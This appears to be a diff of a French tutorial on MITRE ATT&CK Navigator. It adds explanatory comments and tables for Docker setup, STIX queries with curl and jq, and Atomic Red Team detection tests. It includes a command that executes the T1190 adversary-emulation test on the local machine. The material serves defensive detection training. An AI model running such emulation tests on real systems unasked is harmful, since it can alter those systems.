 **Étape 4 : Exporter la couche** (5 min)
 
 ```bash
-# Dans l'interface Navigator :
-# 1. Cliquer sur l'icône de téléchargement (⬇)
-# 2. Choisir "Download as JSON"
-# 3. Enregistrer sous : CaisseNoire_heatmap.json
+# Dans l'interface Navigator : export de la couche au format JSON
+# 1. Cliquer sur l'icône de téléchargement (⬇) dans la barre d'outils supérieure
+# 2. Choisir "Download as JSON" pour générer le fichier de couche portable
+# 3. Enregistrer le fichier sous le nom : CaisseNoire_heatmap.json
+# Le fichier JSON contient toutes les techniques, scores, couleurs et commentaires
 ```
+
+**Explication :**
+
+| Action | Description |
+|---|---|
+| Icône de téléchargement (⬇) | Bouton dans la barre d'outils de Navigator qui ouvre le menu d'export |
+| "Download as JSON" | Option de téléchargement qui génère un fichier JSON contenant toutes les annotations de la couche |
+| `CaisseNoire_heatmap.json` | Nom du fichier de sortie contenant la heat map exportée pour l'opération CaisseNoire |
 
 **Étape 5 : Interpréter les résultats** (10 min)
 
@@ -1152,40 +1471,124 @@ Voici le fichier de couche correspondant à la correction de l'exercice :
 ## Annexe B : Commandes essentielles
 
 ```bash
-# === ATT&CK Navigator ===
+# ====================================================================
+# ATT&CK NAVIGATOR — Commandes de gestion du conteneur Docker
+# ====================================================================
+
+# Cloner le dépôt officiel de l'ATT&CK Navigator
 git clone https://github.com/mitre-attack/attack-navigator.git
+
+# Se placer dans le répertoire du projet
 cd attack-navigator
+
+# Construire l'image Docker (voir section 5.2 pour le détail des flags)
 docker build -t attack-navigator .
+
+# Lancer le conteneur en arrière-plan avec mappage de port
 docker run -d -p 4200:4200 --name attack-navigator attack-navigator
 
-# Arrêter le conteneur
+# Arrêter le conteneur proprement (envoie SIGTERM au processus principal)
 docker stop attack-navigator
 
-# Redémarrer le conteneur
+# Redémarrer un conteneur existant (après un arrêt)
 docker start attack-navigator
 
-# Supprimer le conteneur
+# Supprimer définitivement le conteneur (nécessite un arrêt préalable)
 docker rm attack-navigator
 
-# === Recherche dans la matrice ATT&CK (API) ===
-# Liste de toutes les techniques
+# ====================================================================
+# RECHERCHE DANS LA MATRICE ATT&CK VIA L'API STIX
+# ====================================================================
+```
+
+> **Prérequis — Installation de jq :**
+> ```bash
+> # Installation de jq : outil en ligne de commande pour traiter et filtrer du JSON
+> # jq permet d'extraire des champs spécifiques depuis la réponse JSON de l'API STIX
+> # -y : répond "oui" automatiquement à la confirmation d'installation
+> sudo apt install -y jq
+> ```
+>
+> **Explication :**
+>
+> | Commande | Rôle |
+> |---|---|
+> | `sudo apt install -y jq` | Installe `jq`, un processeur JSON en ligne de commande, utilisé pour filtrer les réponses de l'API ATT&CK |
+
+```bash
+# Liste de toutes les techniques de la matrice Enterprise via l'API STIX
+# curl -s : requête HTTP silencieuse (sans barre de progression)
+# L'URL pointe vers le flux STIX officiel de MITRE au format JSON
+# | (pipe) : redirige la sortie de curl vers jq
+# jq '.objects[] | select(.type=="attack-pattern") | {"id": ..., "name": ...}'
+#   .objects[] : parcourt chaque élément du tableau "objects"
+#   select(.type=="attack-pattern") : filtre pour ne garder que les techniques (type attack-pattern)
+#   {"id": .external_references[0].external_id, "name": .name} : extrait l'ID ATT&CK (ex: T1190) et le nom
 curl -s https://raw.githubusercontent.com/mitre-attack/attack-stix-data/master/enterprise-attack/enterprise-attack.json \
     | jq '.objects[] | select(.type=="attack-pattern") | {"id": .external_references[0].external_id, "name": .name}'
 
-# Recherche d'une technique spécifique
+# Recherche d'une technique spécifique par son identifiant ATT&CK
+# Même flux STIX, mais on filtre sur l'external_id == "T1190" (Exploit Public-Facing Application)
+# On extrait cette fois le nom et la description complète de la technique
 curl -s https://raw.githubusercontent.com/mitre-attack/attack-stix-data/master/enterprise-attack/enterprise-attack.json \
     | jq '.objects[] | select(.external_references[0].external_id == "T1190") | {name, description}'
 
-# === Atomic Red Team (exécution de tests) ===
-# Installation
+# ====================================================================
+# ATOMIC RED TEAM — Exécution de tests de détection
+# ====================================================================
+
+# Installation du framework Atomic Red Team (tests de détection automatisés)
+# git clone : télécharge le dépôt contenant tous les tests organisés par technique ATT&CK
 git clone https://github.com/redcanaryco/atomic-red-team.git
+
+# Se placer dans le répertoire du projet
 cd atomic-red-team
+
+# Installation des dépendances Python (nécessaires pour certains tests)
+# pip : gestionnaire de paquets Python
+# -r requirements.txt : installe toutes les librairies listées dans le fichier requirements
 pip install -r requirements.txt
 
-# Exécution d'un test (ex: T1190 - SQL Injection)
+# Exécution d'un test spécifique — Affichage des détails
+# Invoke-AtomicTest : commande PowerShell du framework Atomic Red Team
+# T1190 : identifiant ATT&CK de la technique à tester (Exploit Public-Facing Application)
+# -ShowDetails : affiche les détails du test sans l'exécuter (mode dry-run)
 Invoke-AtomicTest T1190 -ShowDetails
+
+# Exécution réelle du test
+# -Execute : lance effectivement le test sur la machine (attention : peut modifier le système)
+# En environment de test, cela permet de valider que les règles de détection fonctionnent
 Invoke-AtomicTest T1190 -Execute
 ```
+
+**Explication des commandes Docker (Navigator) :**
+
+| Commande | Rôle |
+|---|---|
+| `docker build -t attack-navigator .` | Construit l'image Docker à partir du Dockerfile |
+| `docker run -d -p 4200:4200 --name attack-navigator attack-navigator` | Lance le conteneur en arrière-plan |
+| `docker stop attack-navigator` | Arrête proprement le conteneur (SIGTERM) |
+| `docker start attack-navigator` | Redémarre un conteneur arrêté |
+| `docker rm attack-navigator` | Supprime le conteneur (définitif) |
+
+**Explication des commandes de recherche (curl + jq) :**
+
+| Commande / Option | Rôle / Explication |
+|---|---|
+| `curl -s <URL>` | Télécharge le fichier JSON du flux STIX ; `-s` = mode silencieux (sans progression) |
+| `jq '.objects[] \| select(.type=="attack-pattern") \| {"id": ..., "name": ...}'` | Filtre le JSON : parcourt tous les objets, ne garde que les `attack-pattern` (techniques), extrait l'ID ATT&CK et le nom |
+| `.external_references[0].external_id` | Chemin d'accès à l'identifiant MITRE ATT&CK (première référence externe) |
+| `select(.external_references[0].external_id == "T1190")` | Filtre pour ne garder que la technique dont l'ID est "T1190" |
+| `{name, description}` | Extrait uniquement les champs `name` et `description` de l'objet JSON |
+
+**Explication des commandes Atomic Red Team :**
+
+| Commande / Option | Rôle / Explication |
+|---|---|
+| `git clone https://github.com/redcanaryco/atomic-red-team.git` | Télécharge le dépôt contenant les tests de détection organisés par technique ATT&CK |
+| `pip install -r requirements.txt` | Installe les dépendances Python nécessaires à l'exécution des tests |
+| `Invoke-AtomicTest T1190 -ShowDetails` | Affiche les détails du test pour la technique T1190 sans l'exécuter (dry-run) |
+| `Invoke-AtomicTest T1190 -Execute` | Exécute effectivement le test T1190 sur la machine locale (pour tester la détection) |
 
 ---
 
